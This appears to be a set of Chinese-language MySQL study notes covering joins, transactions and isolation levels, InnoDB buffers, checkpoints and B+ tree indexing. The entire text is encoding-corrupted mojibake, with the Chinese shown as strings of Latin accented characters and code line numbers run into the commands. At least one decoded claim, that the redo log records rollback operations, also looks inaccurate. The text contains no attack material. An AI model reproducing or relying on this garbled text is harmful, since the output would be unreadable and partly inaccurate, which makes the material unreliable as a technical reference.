å­æŸ¥è¯¢å…è®¸æŠŠä¸€ä¸ªæŸ¥è¯¢åµŒå¥—åœ¨å¦ä¸€ä¸ªæŸ¥è¯¢å½“ä¸­ã€‚ å¤‡ä»½ä¸æ¢å¤ 1mysqldump -uç”¨æˆ·å -på¯†ç  æ•°æ®åº“å&gt;ç”Ÿæˆçš„è„šæœ¬æ–‡ä»¶è·¯å¾„ 1234mysql -uroot -på¯†ç  æ•°æ®åº“å &lt; æ–‡ä»¶è·¯å¾„æˆ–è€…åœ¨ mysql å‘½ä»¤è¡Œå¤–ï¼šsource SQLè„šæœ¬è·¯å¾„ å…³ç³» ä¸€å¯¹ä¸€ï¼šæ¯”å¦‚ï¼Œä¸€ä¸ªç”·çš„åªèƒ½å–ä¸€ä¸ªå¥³çš„å½“è€å©†ã€‚ 1234#å¤–é”®å”¯ä¸€ALTER TABLE husband ADD wid INT UNIQUE;#å¤–é”®çº¦æŸalter table husband add foreign key (wid) references wife(id); ä¸€å¯¹å¤šï¼šæ¯”å¦‚ï¼Œå®¢æˆ·ä¸è®¢å•ï¼Œä¸€ä¸ªå®¢æˆ·å¯ä»¥åœ¨å•†åŸä¸­ä¸‹å¤šä¸ªè®¢å•ã€‚ å”¯ä¸€åŒºåˆ«å°±æ˜¯å¤–é”®ä¸å”¯ä¸€ã€‚ å¤šå¯¹å¤šï¼šæ¯”å¦‚ï¼Œå­¦ç”Ÿä¸è¯¾ç¨‹ï¼Œä¸€ä¸ªå­¦æ ¡æœ‰å¾ˆå¤šå­¦ç”Ÿï¼Œå­¦ç”Ÿéƒ½å¯ä»¥å­¦å¾ˆå¤šè¯¾ç¨‹ã€‚ éœ€è¦ä¸­é—´è¡¨å»å®Œæˆå¤šå¯¹å¤šå…³ç³»çš„åˆ›å»ºï¼Œå¤šå¯¹å¤šå…³ç³»å…¶å®å°±æ˜¯ä¸¤ä¸ªä¸€å¯¹å¤šå…³ç³»çš„ç»„åˆã€‚ è¿æ¥ ç¬›å¡å°”ç§¯ 123-- æŸ¥è¯¢çš„æ—¶å€™-- å·¦è¾¹è¡¨ä¸­çš„æ¯ä¸€æ¡è®°å½•å’Œå³è¾¹è¡¨çš„æ¯ä¸€æ¡è®°å½•éƒ½è¿›è¡Œç»„åˆäº†select * from worker, department; æœ‰ä¸€äº›æ•°æ®å…¶å®æ˜¯æ— ç”¨çš„ï¼Œåªæœ‰æ»¡è¶³ worker.depart_id = department.id è¿™ä¸ªæ¡ä»¶ï¼Œè¿‡æ»¤å‡ºæ¥çš„æ•°æ®æ‰æ˜¯æˆ‘ä»¬æƒ³è¦çš„æœ€ç»ˆç»“æœã€‚ 1select * from worker, department where worker.depart_id = department.id; éšå¼å†…è¿æ¥ï¼ˆä½¿ç”¨ where å…³é”®å­—æ¥æŒ‡å®šæ¡ä»¶ï¼‰ æ˜¾ç¤ºå†…è¿æ¥ï¼ˆä½¿ç”¨ inner..join..on è¯­å¥ï¼‰ å·¦å¤–è¿æ¥: select å­—æ®µ from å·¦è¡¨ left outer join å³è¡¨ .. on æ¡ä»¶ â€‹ å…ˆä¿è¯å·¦è¾¹çš„æ•°æ®å…¨éƒ¨å±•ç¤ºï¼Œå†å»æ‰¾å³è¡¨ä¸­çš„æ•°æ®ã€‚ å³å¤–è¿æ¥: select å­—æ®µ from å·¦è¡¨ right outer join å³è¡¨.. on æ¡ä»¶ â€‹ ä¿è¯å³è¾¹è¡¨ä¸­çš„å…¨éƒ¨æ•°æ®éƒ½å±•ç¤º äº‹åŠ¡ è¦ä¹ˆæˆåŠŸï¼Œè¦ä¹ˆä¸æˆåŠŸå›æ»š å½“æˆ‘ä»¬åœ¨ MySQL ä¸­ï¼Œå¦‚æœå¼€å¯äº†äº‹åŠ¡ï¼Œé‚£ä¹ˆä½ æ‰€æœ‰çš„æ“ä½œéƒ½ä¼šä¸´æ—¶è¢«ä¿å­˜åœ¨äº‹åŠ¡æ—¥å¿—ä¸­ï¼Œåªæœ‰é‡ä¸Š commitï¼ˆæäº¤ï¼‰å‘½ä»¤çš„æ—¶å€™ï¼Œæ‰ä¼šåŒæ­¥åˆ°æ•°æ®è¡¨ä¸­ã€‚å¦‚æœé‡ä¸Š rollback å’Œ æ–­å¼€è¿æ¥ï¼Œé‚£ä¹ˆå®ƒéƒ½ä¼šå»æ¸…ç©ºäº‹åŠ¡æ—¥å¿—ã€‚ 1234ç¬¬ä¸€æ­¥ï¼šå¼€å¯äº‹åŠ¡ç¬¬äºŒæ­¥ï¼šæ‰§è¡Œä½ çš„ SQL è¯­å¥ç¬¬ä¸‰æ­¥ï¼šæäº¤äº‹åŠ¡ç¬¬å››æ­¥ï¼šå¦‚æœå‡ºç°é—®é¢˜çš„è¯ï¼Œåˆ™å›æ»šäº‹åŠ¡ï¼ˆæ•°æ®ï¼‰ 12345678ç¬¬ä¸€æ­¥ï¼šå¼€å¯äº‹åŠ¡start transaction;ç¬¬äºŒæ­¥ï¼šæ‰§è¡Œä½ çš„ SQL è¯­å¥update bankCount set money = money - 500 where name = 'cuihua';update bankCount set money = money + 500 where name = 'banban';ç¬¬ä¸‰æ­¥ï¼šå¦‚æœå‡ºç°é—®é¢˜çš„è¯ï¼Œåˆ™å›æ»šäº‹åŠ¡ï¼ˆæ•°æ®ï¼‰commit;// rollback; ç‰¹æ€§ åŸå­æ€§ï¼ˆæ“ä½œï¼‰ï¼šAtomicity åœ¨æ¯ä¸€ä¸ªäº‹åŠ¡ä¸­ï¼Œéƒ½å¯ä»¥çœ‹æˆæ˜¯ä¸€ä¸ªæ•´ä½“ï¼Œä¸èƒ½å°†å…¶å†åº¦åˆ†è§£ï¼Œæ‰€æœ‰çš„æ“ä½œï¼Œè¦ä¹ˆä¸€èµ·æˆåŠŸï¼Œè¦ä¹ˆä¸€èµ·å¤±è´¥ã€‚ ä¸€è‡´æ€§ï¼ˆæ•°æ®ï¼‰ï¼šConsistency åœ¨äº‹åŠ¡æ‰§è¡Œå‰æ•°æ®çš„æ‰€æœ‰çŠ¶æ€è·Ÿæ‰§è¡Œåçš„æ•°æ®çŠ¶æ€åº”è¯¥æ˜¯ä¸€æ ·çš„ã€‚æ¯”å¦‚ï¼Œè½¬è´¦å‰ä¸¤ä¸ªè´¦æˆ·çš„é‡‘é¢æ€»å’Œåº”è¯¥è·Ÿè½¬è´¦åä¸¤ä¸ªè´¦æˆ·çš„æ€»é‡‘é¢éƒ½æ˜¯ä¸€æ ·çš„ã€‚ éš”ç¦»æ€§ï¼ˆäº‹åŠ¡ï¼‰ï¼šIsolation å¤šä¸ªäº‹åŠ¡ä¹‹é—´ä¸èƒ½ç›¸äº’å½±å“ï¼Œå¿…é¡»ä¿è¯å…¶æ“ä½œçš„å•ç‹¬æ€§ï¼Œå¦åˆ™ä¼šå‡ºç°ä¸€äº›ä¸²æ”¹çš„æƒ…å†µï¼Œæ‰§è¡Œçš„æ—¶å€™åº”è¯¥ä¿æŒéš”ç¦»çš„çŠ¶æ€ã€‚ æŒä¹…æ€§ï¼ˆç»“æœï¼‰ï¼šDurability å¦‚æœæˆ‘ä»¬çš„äº‹åŠ¡æ‰§è¡ŒæˆåŠŸä¹‹åï¼Œå®ƒå°†æŠŠæ•°æ®æ°¸ä¹…æ€§å­˜å‚¨åˆ°æ•°æ®åº“ä¸­ï¼Œå“ªæ€•è®¾å¤‡å…³æœºä¹‹åï¼Œä¹Ÿæ˜¯èƒ½å¤Ÿä¿å­˜ä¸‹æ¥çš„ã€‚ ä¸åŒéš”ç¦»çº§åˆ«çš„é—®é¢˜ è„è¯»ï¼šå…¶ä¸­ä¸€ä¸ªäº‹åŠ¡è¯»å–åˆ°äº†å¦å¤–ä¸€ä¸ªäº‹åŠ¡ä¸­çš„æ•°æ®ï¼ˆå°šæœªæäº¤çš„æ•°æ®ï¼‰ã€‚ ä¸å¯é‡å¤è¯»ï¼šä¸€ä¸ªäº‹åŠ¡ä¸­ä¸¤æ¬¡è¯»å–æ•°æ®çš„æ—¶å€™ï¼Œå‘ç°æ•°æ®çš„å†…å®¹ä¸ä¸€æ ·ã€‚ä¸€èˆ¬æ˜¯ update æ“ä½œå¼•å‘ã€‚ å¹»è¯»ï¼šä¸€ä¸ªäº‹åŠ¡ä¸­ï¼Œä¸¤æ¬¡è¯»å–æ•°æ®çš„æ—¶å€™ï¼Œå‘ç°æ•°æ®çš„æ•°é‡ä¸ä¸€æ ·ã€‚ä¸€èˆ¬æ˜¯ insert æˆ–è€… delete æ“ä½œå¼•èµ·ã€‚ éš”ç¦»çº§åˆ« read uncommitted è¯»æœªæäº¤ read committed è¯»å·²æäº¤ï¼šè§£å†³è„è¯» repeatable read å¯é‡å¤è¯»ï¼ˆé»˜è®¤ï¼‰ï¼šè§£å†³ä¸å¯é‡å¤è¯» serializable ä¸²è¡ŒåŒ–ï¼šè§£å†³å¹»è¯» ç”¨æˆ·è®¾ç½® åˆ›å»ºã€æˆæƒã€ä¿®æ”¹ç­‰æ“ä½œã€‚ MySQL ç»“æ„ MySQLä»ç‰©ç†ç»“æ„ä¸Šå¯ä»¥åˆ†ä¸ºï¼š æ—¥å¿—æ–‡ä»¶ æ•°æ®ç´¢å¼•æ–‡ä»¶ MySQLåœ¨Linuxä¸­çš„æ•°æ®ç´¢å¼•æ–‡ä»¶å’Œæ—¥å¿—æ–‡ä»¶é€šå¸¸æ”¾åœ¨ /var/lib/mysql ç›®å½•ä¸‹ã€‚ æ—¥å¿— å¸¸ç”¨çš„æ—¥å¿—æ–‡ä»¶åŒ…æ‹¬ï¼š é”™è¯¯æ—¥å¿—: é”™è¯¯æ—¥å¿—è®°å½•äº†è¿è¡Œè¿‡ç¨‹ä¸­é‡åˆ°çš„æ‰€æœ‰ä¸¥é‡çš„é”™è¯¯ä¿¡æ¯ï¼Œä»¥åŠ MySQL æ¯æ¬¡å¯åŠ¨å’Œå…³é—­çš„è¯¦ç»†ä¿¡æ¯ã€‚ äºŒè¿›åˆ¶æ—¥å¿—: binlogè®°å½•äº†æ•°æ®åº“æ‰€æœ‰çš„ddlè¯­å¥å’Œdmlè¯­å¥ æŸ¥è¯¢æ—¥å¿—ï¼šè®°å½•ç”¨æˆ·çš„æ‰€æœ‰æ“ä½œï¼Œå½±å“ä½¿ç”¨æ€§èƒ½ï¼Œä¸€èˆ¬ä¸å¯ç”¨ æ…¢æŸ¥è¯¢æ—¥å¿—ï¼šè®°å½•æ‰§è¡Œæ—¶é—´è¶…è¿‡long_query_timeç§’çš„æ‰€æœ‰æŸ¥è¯¢ äº‹åŠ¡Redoæ—¥å¿— ä¸­ç»§æ—¥å¿— æ•°æ®ç´¢å¼• ibdata æ–‡ä»¶ï¼šä½¿ç”¨å…±äº«è¡¨ç©ºé—´å­˜å‚¨è¡¨æ•°æ®å’Œç´¢å¼•ä¿¡æ¯ï¼Œæ‰€æœ‰è¡¨å…±åŒä½¿ç”¨ä¸€ä¸ªæˆ–è€…å¤šä¸ªibdataæ–‡ä»¶ã€‚ InnoDBå­˜å‚¨å¼•æ“çš„æ•°æ®æ–‡ä»¶ .frmæ–‡ä»¶ï¼šä¸»è¦å­˜æ”¾ä¸è¡¨ç›¸å…³çš„æ•°æ®ä¿¡æ¯ï¼Œä¸»è¦åŒ…æ‹¬è¡¨ç»“æ„çš„å®šä¹‰ä¿¡æ¯ .ibdï¼šä½¿ç”¨ç‹¬äº«è¡¨ç©ºé—´å­˜å‚¨è¡¨æ•°æ®å’Œç´¢å¼•ä¿¡æ¯ï¼Œä¸€å¼ è¡¨å¯¹åº”ä¸€ä¸ªibdæ–‡ä»¶ã€‚ æ•°æ®å¤„ç†ï¼š è”æœºäº‹åŠ¡å¤„ç† OLTP (On-Line Transaction Processing)ï¼šåŸºæœ¬ä½¿ç”¨ï¼Œéæµ·é‡æ•°æ® è”æœºåˆ†æå¤„ç† OLAP (On-Line Analytical Processing)ï¼šæ•°æ®é‡å¤§ï¼Œå®æ—¶æ€§è¦æ±‚ä¸é«˜ å­˜å‚¨å½¢å¼ï¼š è¡Œå¼ï¼šä¸æ˜¯é€‚åˆæµ·é‡æ•°æ® åˆ—å¼ï¼ˆå„åˆ—ç‹¬ç«‹å­˜å‚¨ï¼Œåˆ©äºå‹ç¼©ï¼‰ï¼šä½å»¶è¿Ÿã€æŸ¥æ‰¾é«˜æ•ˆï¼Œä¸é€‚åˆåˆ é™¤æ›´æ–°é¢‘ç¹çš„åœºæ™¯ æ¶æ„ SQLçš„æ‰§è¡Œé€»è¾‘ï¼š ç¼“å­˜çš„ä¼ç¬” æŸ¥è¯¢ç¼“å­˜é»˜è®¤æ˜¯å…³é—­çš„çŠ¶æ€ï¼Œå¤šæ•°æƒ…å†µä¸‹ï¼Œä¸å»ºè®®ä½¿ç”¨MySQLæŸ¥è¯¢ç¼“å­˜ï¼Œä¸ºä»€ä¹ˆå‘¢ï¼Ÿ å› ä¸ºæŸ¥è¯¢ç¼“å­˜å¾€å¾€å¼Šå¤§äºåˆ©ã€‚ æˆæœ¬é«˜ï¼šæŸ¥è¯¢ç¼“å­˜çš„å¤±æ•ˆéå¸¸é¢‘ç¹ï¼Œåªè¦æœ‰å¯¹ä¸€ä¸ªè¡¨çš„æ›´æ–°ï¼Œè¿™ä¸ªè¡¨ä¸Šæ‰€æœ‰çš„æŸ¥è¯¢ç¼“å­˜éƒ½ä¼šè¢«æ¸…ç©ºã€‚å› æ­¤å¾ˆå¯èƒ½ä½ è´¹åŠ²åœ°æŠŠç»“æœå­˜èµ·æ¥ï¼Œè¿˜æ²¡ä½¿ç”¨å‘¢ï¼Œå°±è¢«ä¸€ä¸ªæ›´æ–°å…¨æ¸…ç©ºäº†ã€‚ å‘½ä¸­ç‡ä¸é«˜ï¼šå¯¹äºæ›´æ–°å‹åŠ›å¤§çš„æ•°æ®åº“æ¥è¯´ï¼ŒæŸ¥è¯¢ç¼“å­˜çš„å‘½ä¸­ç‡ä¼šéå¸¸ä½ã€‚é™¤éä½ çš„ä¸šåŠ¡å°±æ˜¯æœ‰ä¸€å¼ é™æ€è¡¨ï¼Œå¾ˆé•¿æ—¶é—´æ‰ä¼šæ›´æ–°ä¸€æ¬¡ã€‚æ¯”å¦‚ï¼Œä¸€ä¸ªç³»ç»Ÿé…ç½®è¡¨ï¼Œé‚£è¿™å¼ è¡¨ä¸Šçš„æŸ¥è¯¢æ‰é€‚åˆä½¿ç”¨æŸ¥è¯¢ç¼“å­˜ã€‚ æœ‰æ›´å¥½çš„ç¼“å­˜å·¥å…·ï¼šredisã€memcache... InnoDB Buffer Buffer Pool ä¸­æ•°æ®ä»¥é¡µä¸ºå­˜å‚¨å•ä½ï¼Œå…¶å®ç°æ•°æ®ç»“æ„æ˜¯ä»¥é¡µä¸ºå•ä½çš„å•é“¾è¡¨ã€‚é»˜è®¤å¤§å°ä¸º128Mã€‚LRU ç®—æ³•ç¼“å†²çƒ­ç‚¹æ•°æ®ã€‚ Change Buffer ç”¨äºåŠ é€Ÿéçƒ­ç‚¹æ•°æ®ä¸­äºŒçº§ç´¢å¼•çš„å†™å…¥æ“ä½œã€‚ç”±äºäºŒçº§ç´¢å¼•æ•°æ®çš„ä¸è¿ç»­æ€§ï¼Œå¯¼è‡´ä¿®æ”¹äºŒçº§ç´¢å¼•æ—¶éœ€è¦è¿›è¡Œé¢‘ç¹çš„ç£ç›˜ IO æ¶ˆè€—å¤§é‡æ€§èƒ½ï¼ŒChange Buffer ç¼“å†²å¯¹äºŒçº§ç´¢å¼•çš„ä¿®æ”¹æ“ä½œï¼ŒåŒæ—¶å°†å†™æ“ä½œå½•å…¥ redo log ä¸­ï¼Œåœ¨ç¼“å­˜åˆ°ä¸€å®šé‡æˆ–ç³»ç»Ÿç©ºé—²æ—¶è¿›è¡Œ merge æ“ä½œå°†ä¿®æ”¹å†™å…¥ç£ç›˜ä¸­ï¼Œä»è€Œè¾¾åˆ°å‡å°‘ç£ç›˜ I/O çš„ç›®çš„ã€‚ äºŒçº§ç´¢å¼•å°±æ˜¯è¾…åŠ©ç´¢å¼•ï¼Œé™¤äº†èšç°‡ç´¢å¼•ä¹‹å¤–çš„æ‰€æœ‰ç´¢å¼•éƒ½æ˜¯äºŒçº§ç´¢å¼•ã€‚ èšç°‡ç´¢å¼•æ˜¯ä¹Ÿå«èšé›†ç´¢å¼•ï¼Œæœ‰çš„ä¹Ÿå«ç´¢å¼•ç»„ç»‡è¡¨ã€‚ InnoDB ä½¿ç”¨ Log Buffer æ¥ç¼“å†²æ—¥å¿—æ–‡ä»¶çš„å†™å…¥æ“ä½œã€‚äº‹åŠ¡æäº¤çš„æ—¶å€™å¿…é¡»å°†æ“ä½œå†™å…¥æ—¥å¿—ä¸­ï¼Œæ­¤æ—¶æ—¥å¿—æ–‡ä»¶è‹¥æœªè½ç›˜è€Œç³»ç»Ÿå´©æºƒï¼Œåˆ™ç›¸å…³æ“ä½œå°†ä¸¢å¤±è€Œæ— æ³•æ¢å¤ã€‚ InnoDB æä¾›ä¸‰ç§ Log Buffer æ•°æ®è½ç›˜æ–¹å¼ 0ï¼šæŒ‰ç§’å†™ï¼ŒæŒ‰ç§’åˆ·ã€‚æ¯ç§’è°ƒç”¨ write() å†™å…¥ OS Buffer å¹¶è°ƒç”¨ flush() åˆ·å…¥ç£ç›˜ã€‚ 1ï¼šå®æ—¶å†™ï¼Œå®æ—¶åˆ·ã€‚æ¯æ¬¡äº‹åŠ¡æäº¤éƒ½è°ƒç”¨ write() å†™å…¥ OS Buffer å¹¶è°ƒç”¨ flush() åˆ·å…¥ç£ç›˜ã€‚ 2ï¼šå®æ—¶å†™ï¼Œå»¶è¿Ÿåˆ·ã€‚æ¯æ¬¡äº‹åŠ¡æäº¤éƒ½è°ƒç”¨ write() å†™å…¥ OS Bufferï¼Œä½†æ¯ç§’è°ƒç”¨ flush() åˆ·å…¥ç£ç›˜ã€‚ ç£ç›˜æ–‡ä»¶ åœ¨ç£ç›˜ä¸­ï¼ŒInnoDB å°†æ‰€æœ‰æ•°æ®éƒ½å­˜æ”¾åœ¨ä¸€ä¸ªç©ºé—´ä¸­ï¼Œç§°ä¸ºè¡¨ç©ºé—´ï¼ˆTablespaceï¼‰ã€‚è¡¨ç©ºé—´ç”±æ®µ ï¼ˆSegmentï¼‰ã€åŒºï¼ˆextentï¼‰ã€é¡µï¼ˆPageï¼‰ç»„æˆã€‚ åŒºï¼ˆExtendï¼‰æ˜¯ç”±è¿ç»­çš„é¡µç»„æˆçš„ç©ºé—´ï¼Œå¤§å°å›ºå®šä¸º 1MBï¼Œç”±äºé»˜è®¤é¡µå¤§å°ä¸º 16Kï¼Œå› æ­¤ä¸€ä¸ªåŒºé»˜è®¤å­˜å‚¨ 64 ä¸ªè¿ç»­çš„é¡µã€‚ é¡µï¼ˆPageï¼‰æ˜¯ InnoDB çš„åŸºæœ¬å­˜å‚¨å•ä½ï¼Œæ¯ä¸ªé¡µå¤§å°é»˜è®¤ä¸º 16Kã€‚æ“ä½œç³»ç»Ÿç®¡ç†ç£ç›˜çš„æœ€å°å•ä½ä¹Ÿæ˜¯é¡µï¼Œæ˜¯æ“ä½œç³»ç»Ÿè¯»å†™ç£ç›˜æœ€å°å•ä½ï¼ŒLinuxä¸­é¡µä¸€èˆ¬æ˜¯4Kã€‚æ‰€ä»¥InnoDBä»ç£ç›˜ä¸­è¯»å–ä¸€ä¸ªæ•°æ®é¡µæ—¶ï¼Œæ“ä½œç³»ç»Ÿä¼šåˆ†4æ¬¡ä»ç£ç›˜æ–‡ä»¶ä¸­è¯»å–æ•°æ®åˆ°å†…å­˜ã€‚å†™å…¥ä¹Ÿæ˜¯ä¸€æ ·çš„ï¼Œéœ€è¦åˆ†4æ¬¡ä»å†…å­˜å†™å…¥åˆ°ç£ç›˜ä¸­ã€‚ è¡¨ç©ºé—´æ˜¯ InnoDB ç‰©ç†å­˜å‚¨ä¸­çš„æœ€é«˜å±‚ï¼Œç›®å‰çš„è¡¨ç©ºé—´ç±»åˆ«åŒ…æ‹¬ï¼š ç³»ç»Ÿè¡¨ç©ºé—´ï¼ˆSystem Tablespaceï¼‰ ç‹¬ç«‹è¡¨ç©ºé—´ï¼ˆFile-per-table Tablespaceï¼‰ é€šç”¨è¡¨ç©ºé—´ï¼ˆGeneral Tablespaceï¼‰ å›æ»šè¡¨ç©ºé—´ï¼ˆUndo Tablespaceï¼‰ ä¸´æ—¶è¡¨ç©ºé—´ï¼ˆThe Temporary Tablespaceï¼‰ è‡ªé€‚åº”å“ˆå¸Œç´¢å¼•(AHI) æ˜¯å»ºç«‹åœ¨ç´¢å¼•ä¹‹ä¸Šçš„ç´¢å¼•ã€‚AHI æ‰€ä½œç”¨çš„ç›®æ ‡æ˜¯ç´¢å¼•é¢‘ç¹æŸ¥è¯¢çš„æ•°æ®é¡µå’Œç´¢å¼•é¡µï¼Œè€Œç”±äºæ•°æ®é¡µæ˜¯èšç°‡ç´¢å¼•çš„ä¸€éƒ¨åˆ†ï¼Œå› æ­¤ AHI æ˜¯å»ºç«‹åœ¨ç´¢å¼•ä¹‹ä¸Šçš„ç´¢å¼•ã€‚ æ•°æ®è½ç›˜ ä¿®æ”¹æ•°æ®åº“ä¸­é¡µæ—¶ï¼Œé¡µä»ç¼“å†²æ± åˆ·æ–°å›ç£ç›˜çš„æ“ä½œå¹¶ä¸æ˜¯åœ¨æ¯æ¬¡é¡µå‘ç”Ÿæ›´æ–°æ—¶éƒ½è§¦å‘ï¼Œè€Œæ˜¯é€šè¿‡ä¸€ç§ç§°ä¸ºCheckPointçš„æœºåˆ¶åˆ·æ–°å›ç£ç›˜ã€‚ é€šè¿‡å®šæœŸæ‰¹é‡å†™å…¥ç£ç›˜çš„æ–¹å¼æé«˜å†™å…¥æ•ˆç‡å‡å°‘ç£ç›˜ IOã€‚ å†…å­˜é‡Œç¼“å†²æ± ä¸­çš„æ•°æ®é¡µè¦å®ŒæˆæŒä¹…åŒ–é€šè¿‡ä¸¤ä¸ªæµç¨‹æ¥å®Œæˆï¼š è„é¡µè½ç›˜ï¼šè¦å†™çš„æ•°æ® redo logè½ç›˜ï¼šå›æ»šæ“ä½œè®°å½• InnoDBé‡‡ç”¨äº†Write Ahead Logï¼ˆWALï¼‰ç­–ç•¥å’ŒForce Log at Commitæœºåˆ¶å®ç°äº‹åŠ¡çº§åˆ«ä¸‹æ•°æ®çš„ æŒä¹…æ€§ï¼š Force Log at Commitæœºåˆ¶ï¼šè¦æ±‚å½“ä¸€ä¸ªäº‹åŠ¡æäº¤æ—¶ï¼Œæ‰€æœ‰äº§ç”Ÿçš„æ—¥å¿—éƒ½å¿…é¡»åˆ·æ–°åˆ°ç£ç›˜ä¸Šã€‚ Write Ahead Logï¼ˆWALï¼‰ç­–ç•¥ï¼šè¦æ±‚æ•°æ®çš„å˜æ›´å†™å…¥åˆ°ç£ç›˜å‰ï¼Œé¦–å…ˆå¿…é¡»å°†å†…å­˜ä¸­çš„æ—¥å¿—å†™å…¥åˆ°ç£ç›˜ã€‚ ä¸ºäº†ç¡®ä¿æ¯æ¬¡æ—¥å¿—éƒ½å†™å…¥åˆ°redoæ—¥å¿—æ–‡ä»¶ï¼Œåœ¨æ¯æ¬¡å°†redoæ—¥å¿—ç¼“å†²å†™å…¥redoæ—¥å¿—åï¼Œè°ƒç”¨ä¸€æ¬¡ fsync æ“ä½œï¼Œå°†ç¼“å†²æ–‡ä»¶ä»æ–‡ä»¶ç³»ç»Ÿç¼“å­˜ä¸­çœŸæ­£å†™å…¥ç£ç›˜ã€‚ Checkpoint æ£€æŸ¥ä»€ä¹ˆï¼Ÿ ç¼©çŸ­æ•°æ®åº“çš„æ¢å¤æ—¶é—´ï¼šå½“æ•°æ®åº“å‘ç”Ÿå®•æœºæ—¶ï¼Œæ•°æ®åº“ä¸éœ€è¦é‡åšæ‰€æœ‰çš„æ—¥å¿—ï¼Œå› ä¸ºCheckpointä¹‹å‰çš„é¡µéƒ½å·²ç»åˆ·æ–°å›ç£ç›˜ã€‚æ•°æ®åº“åªéœ€å¯¹Checkpointåçš„redoæ—¥å¿—è¿›è¡Œæ¢å¤ï¼Œè¿™æ ·å°±å¤§å¤§ç¼©çŸ­äº† æ¢å¤çš„æ—¶é—´ã€‚ ç¼“å†²æ± ä¸å¤Ÿç”¨æ—¶ï¼Œå°†è„é¡µåˆ·æ–°åˆ°ç£ç›˜ã€‚ redoæ—¥å¿—ä¸å¯ç”¨æ—¶ï¼Œåˆ·æ–°è„é¡µ ä½•ä¸ºåŒå†™ï¼Ÿ å†™åˆ°å†…å­˜ä¸­çš„double write buffer å†™åˆ°ç‰©ç†ç£ç›˜ä¸Šå…±äº«è¡¨ç©ºé—´ä¸­è¿ç»­çš„128ä¸ªé¡µï¼Œå³2ä¸ªåŒºï¼ˆextentï¼‰ï¼Œå¤§å°åŒæ ·ä¸º2MB å´©æºƒæ¢å¤æµç¨‹ï¼š ç´¢å¼• Hashè¡¨ï¼š ä¸æ”¯æŒèŒƒå›´å¿«é€ŸæŸ¥æ‰¾ï¼ŒèŒƒå›´æŸ¥æ‰¾æ—¶è¿˜æ˜¯åªèƒ½é€šè¿‡æ‰«æå…¨è¡¨æ–¹å¼ã€‚ æ•°æ®ç»“æ„æ¯”è¾ƒç¨€ç–ï¼Œä¸é€‚åˆåšèšåˆï¼Œä¸é€‚åˆåšèŒƒå›´ç­‰æŸ¥æ‰¾ã€‚ ä½¿ç”¨åœºæ™¯ï¼Œå¯¹æŸ¥è¯¢å¹¶å‘è¦æ±‚å¾ˆé«˜ï¼ŒK/Vå†…å­˜æ•°æ®åº“ï¼Œç¼“å­˜ã€‚ äºŒå‰æŸ¥æ‰¾æ ‘ï¼š æŸ¥æ‰¾é€€åŒ–é—®é¢˜ï¼ŒIOæ¬¡æ•°å¾ˆå¤š çº¢é»‘æ ‘ï¼š æ—¶é—´å¤æ‚åº¦å’Œæ ‘é«˜ç›¸å…³ï¼šæ ‘æœ‰å¤šé«˜å°±éœ€è¦æ£€ç´¢å¤šå°‘æ¬¡ï¼Œæ¯ä¸ªèŠ‚ç‚¹çš„è¯»å–ï¼Œéƒ½å¯¹åº”ä¸€æ¬¡ç£ç›˜ IO æ“ä½œ å¹³è¡¡äºŒå‰æ ‘ä¸æ”¯æŒèŒƒå›´æŸ¥è¯¢å¿«é€ŸæŸ¥æ‰¾ï¼ŒèŒƒå›´æŸ¥è¯¢æ—¶éœ€è¦ä»æ ¹èŠ‚ç‚¹å¤šæ¬¡éå†ï¼ŒæŸ¥è¯¢æ•ˆç‡æå·®ã€‚ Bæ ‘ï¼Œå¤šå‰æ ‘ä¼˜åŒ–ï¼š ç”±äºæ¯ä¸ªèŠ‚ç‚¹éƒ½å­˜å‚¨æ•°æ®ï¼Œç¼“å­˜ç©ºé—´å ç”¨å¤§ å¶å­èŠ‚ç‚¹ä¹Ÿä¸æ˜¯ç›¸è¿çš„ï¼Œæ‰€ä»¥ä¸æ”¯æŒèŒƒå›´æŸ¥è¯¢ B+æ ‘ï¼Œåªæœ‰å¶å­èŠ‚ç‚¹æ‰ä¼šå­˜å‚¨æ•°æ®ï¼Œéå¶å­èŠ‚ç‚¹åªå­˜å‚¨é”®å€¼ã€‚å¶å­èŠ‚ç‚¹ä¹‹é—´ä½¿ç”¨åŒå‘æŒ‡é’ˆè¿æ¥ï¼Œæœ€ åº•å±‚çš„å¶å­èŠ‚ç‚¹å½¢æˆäº†ä¸€ä¸ªåŒå‘æœ‰åºé“¾è¡¨ã€‚å› æ­¤ä¼˜åŒ–äº†Bæ ‘çš„ç¼ºç‚¹ã€‚ æ•°æ®æ®µç§°ä¸º Leaf node segmentï¼Œç´¢å¼•æ®µç§°ä¸º Non-Leaf node segment ç´¢å¼•ä¼˜åŒ–å¯é€‰æ–¹æ³• è¦†ç›–ç´¢å¼• Index Condition Pushdown é¢‘ç¹å‡ºç°åœ¨whereæ¡ä»¶ä¸­çš„åˆ—ï¼Œå»ºè®®åˆ›å»ºç»„åˆç´¢å¼• éµå¾ªç´¢å¼•æœ€å·¦å‰ç¼€åŒ¹é…åŸåˆ™ï¼Œå®¹æ˜“åŒ¹é…çš„å°èŒƒå›´åŒ¹é…æ¡ä»¶å†™å·¦è¾¹ï¼Œç»„åˆç´¢å¼•åº”è¯¥æŠŠé¢‘ç¹ç”¨åˆ°çš„åˆ—ã€åŒºåˆ†åº¦é«˜çš„å€¼æ”¾åœ¨å·¦è¾¹ è¡¨è®°å½•å¾ˆå°‘ä¸éœ€åˆ›å»ºç´¢å¼• ä¸€ä¸ªè¡¨çš„ç´¢å¼•ä¸ªæ•°ä¸èƒ½è¿‡å¤š é¢‘ç¹æ›´æ–°çš„å­—æ®µä¸å»ºè®®ä½œä¸ºç´¢å¼• åŒºåˆ†åº¦ä½çš„å­—æ®µï¼Œä¸å»ºè®®å»ºç´¢å¼• åœ¨InnoDBå­˜å‚¨å¼•æ“ä¸­ï¼Œä¸»é”®ç´¢å¼•å»ºè®®ä½¿ç”¨è‡ªå¢çš„é•¿æ•´å‹ï¼Œé¿å…ä½¿ç”¨å¾ˆé•¿çš„å­—æ®µï¼šä¸»é”®ç´¢å¼•æ ‘ä¸€ä¸ªé¡µèŠ‚ç‚¹å°± 16K ä¸èƒ½ä½¿ç”¨æ— åºçš„å€¼ä½œä¸ºç´¢å¼•ï¼š æ›´æ–°æ•°æ®æ—¶ä¼šå‘ç”Ÿé¢‘ç¹çš„é¡µåˆ†è£‚ï¼Œé¡µå†…æ•°æ®ä¸ç´§å‡‘ï¼Œæµªè´¹ç£ç›˜ç©ºé—´ 